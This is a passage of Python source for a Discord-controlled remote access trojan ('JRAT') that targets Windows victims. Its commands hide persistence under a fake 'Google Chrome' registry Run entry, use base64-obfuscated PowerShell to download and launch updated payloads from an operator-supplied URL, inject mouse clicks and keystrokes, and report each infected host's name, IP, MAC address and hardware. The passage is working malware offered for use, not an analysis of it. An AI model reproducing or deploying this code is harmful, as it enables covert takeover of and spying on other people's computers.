                os.remove(f"{temp_dir}\\specs.txt")
        except Exception as e:
            await ctx.send(f"An error occured getting pc specs.\n\n{e}")

        

@bot.command()
async def selfdestruct(ctx, pc_name):
    '''Self destructs in the victim's computer and will not longer be infected.
    ```md
    ?selfdestruct <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        msg = await ctx.send("Self Destructing... [`Startup Regestery Removed:` `????`, `Path Removal`: `????`]")
        run = False
        file_ = False
        
        sleep(0.25)

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, d("R29vZ2xlIENocm9tZSBBLkwu")) 
            winreg.CloseKey(key)
            run = True
        except:
            run = False
        
        await msg.edit(content=f"Self Destructing... [`Startup Regestery Removed:` `{run}`, `Path Removal`: `????`]")

        sleep(0.25)

        try:
            pd = os.environ["PROGRAMDATA"]
            if os.path.isfile(f"{pd}\\{os.path.basename(this_file)}"):
                os.remove(f"{pd}\\{os.path.basename(this_file)}")
                file_ = True
        except:
            file_ = False

        sleep(0.25)

        await msg.edit(content=f"Self Destructing... [`Startup Registery Removed:` `{run}`, `Path Removal`: `{file_}`]")

        sleep(1)

        if run and file_:
            await msg.delete()
            await ctx.send(f"{get_username()}/{socket.gethostname()} has been disinfected successfully.")
        else:
            await ctx.send(f"An error occured disinfecting {get_username()}/{socket.gethostname()}.")

        subprocess.run(["taskkill", "/f", "/im", os.path.basename(this_file)], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))


@bot.command()
async def restart_rat(ctx, pc_name):
    '''Restarts the rat app.
    ```md
    ?restart_rat <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            pd = os.environ['PROGRAMDATA']
            file_path = f'{pd}\\{os.path.basename(this_file)}'
            if os.path.isfile(file_path):
                os.execv(file_path, [file_path] + sys.argv)       

        except Exception as e:
            await ctx.send(f"Error restarting...\n\n{e}")

@bot.command()
async def version(ctx, pc_name):
    '''Gets the version and the available commands of the rat in the victim's computer.
    ```md
    ?version <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            commands = [command.name for command in bot.commands]

            msg = "### Available commands:-\n\n"
            for command in commands:
                msg+= f"`{command}`\n"

            embed  = discord.Embed(title=f"JRAT - {VERSION_DATE}",description=msg)

            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"Error getting the version...\n\n{e}")

@bot.command()
async def update_rat(ctx, pc_name, url):
    '''Updates the rat in the victim's computer just in case if it was outdated.
    ```md
    ?update_rat <user> <rat_url>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try: # generator.generate_headers()
            command1 = d('SW52b2tlLVdlYlJlcXVlc3QgLVVyaQ==') # Invoke-WebRequest -Uri
            command2 = d('LUhlYWRlcnMgQHsnVXNlci1BZ2VudCcgPSAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMTAgU2FmYXJpLzUzNy4zJ30gLU91dEZpbGUgJGVudjpQUk9HUkFNREFUQSJcX21hdGFkb3IuZXhlIg==') 

            def update_thread():
                subprocess.run([d("Y2hjcA=="),d("NjUwMDE="),d("Pk5VTA=="),d("Jg=="),os.environ[d("U1lTVEVNUk9PVA==")]+d("XHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGU="),d('JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsg'), command1, url, command2], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))

            size_command1 = d('KEludm9rZS1XZWJSZXF1ZXN0IC1Vcmk=') # (Invoke-WebRequest -Uri
            size_command2 = d('LU1ldGhvZCBIZWFkKS5IZWFkZXJzLidDb250ZW50LUxlbmd0aCc=') # -Method Head).Headers.'Content-Length'
            file_size = subprocess.run([d("Y2hjcA=="),d("NjUwMDE="),d("Pk5VTA=="),d("Jg=="),os.environ[d("U1lTVEVNUk9PVA==")]+d("XHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGU="), size_command1, url, size_command2], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg=")).stdout.strip()

            msg = await ctx.send(f"`{pc_name}`: Updating JRAT... `0.00/{int(file_size) / 1024 / 1024:.2f}MB` | `0.00MB/s`")

            threading.Thread(target=update_thread).start()

            pd = os.environ["PROGRAMDATA"]

            while True:
                if os.path.isfile(f"{pd}\_matador.exe"): # wait until matador.exe appears
                    break
                sleep(0.5)

            MBps = 0
            old_file_size = 0
            remaining = 0

            while int(os.path.getsize(f"{pd}\_matador.exe")) != int(file_size):
                live_file_size = os.path.getsize(f"{pd}\_matador.exe")
                MBps = abs(live_file_size - old_file_size)
                if MBps > 0:
                    remaining = (int(file_size) - int(live_file_size)) / MBps

                if int(remaining/60) == 0:
                    time_remaining = f"~{int(remaining%60)} seconds remaining..."
                else:
                    time_remaining = f"~{int(remaining/60)} minutes remaining..."

                await msg.edit(content=f"`{pc_name}`: Updating JRAT... `{int(live_file_size) / 1024 / 1024 :.2f}/{int(file_size) / 1024 / 1024:.2f}MB` | `{MBps/1024/1024:.2f}MB/s` | {time_remaining}")
                sleep(1)
                old_file_size  = live_file_size

            sleep(1)

            try: os.remove(f"{pd}\matador.exe")
            except: ...

            sleep(1)

            os.rename(f"{pd}\_matador.exe", "matador.exe")

            sleep(1)

            subprocess.run([d("Y2hjcA=="),d("NjUwMDE="),d("Pk5VTA=="),d("Jg=="),os.environ[d("U1lTVEVNUk9PVA==")]+d("XHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGU="), d('U3RhcnQtUHJvY2VzcyAkZW52OlBST0dSQU1EQVRBXG1hdGFkb3IuZXhl')], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))

            await msg.edit(content="`matador.exe` has been successfully updated.")

            sleep(3)
            os._exit(0)
        except Exception as e:
            try:
                await ctx.send(e)
            except: ...

# -- INPUT SENDING --

@bot.command()
async def click(ctx, pc_name, x : int, y : int):
    '''Sends a click input to the victims mouse.
    ```md
    ?click <user> <x> <y>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            pyautogui.click(x,y)
            await ctx.send(f"`{pc_name}`: Clicked at `{x},{y}` 🖱️")
        except Exception as e:
            await ctx.send(f"An Error Occured...\n\n{e}")

@bot.command()
async def write(ctx, pc_name, *, input : str):
    '''Sends keyboard input to the victims keyboard.
    ```md
    ?write <user> <input*>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            pyautogui.write(input)
            await ctx.send(f"`{pc_name}`: Input sent «`{input}`». ⌨️")
        except Exception as e:
            await ctx.send(f"An Error Occured...\n\n{e}")

# -- -- -- -- -- -- --

@bot.command()
async def active(ctx):
    '''Returns all active infected users.
    ```md
    ?active
    ```
    '''
    info = f"{platform.system()} | {platform.version()} | {socket.gethostname()} | {socket.gethostbyname(socket.gethostname())} | {':'.join(re.findall('..', '%012x' % uuid.getnode()))} | {platform.processor()} | {str(round(psutil.virtual_memory().total / (1024.0 ** 3)))} GB"

    await ctx.send(f"`{get_username()}`- {info}")


@bot.event
async def on_command_error(ctx, error):
    if get_username() == ADMIN:
        err_msg = ""
        if isinstance(error, commands.MissingRequiredArgument):
            err_msg += "Missing Arguments\n"
        err_msg += str(error) + "\n"
        err_msg += str(type(error))

        await ctx.send(err_msg)
    
def check_connection():
    try: return urllib.request.urlopen("https://www.google.com").getcode() == 200
    except: return False
    
try:
    while True:
        if check_connection() == True:
            try:
                bot.run(TOKEN)
            except: 
                sleep(3)
        else:
            sleep(3)
except: ...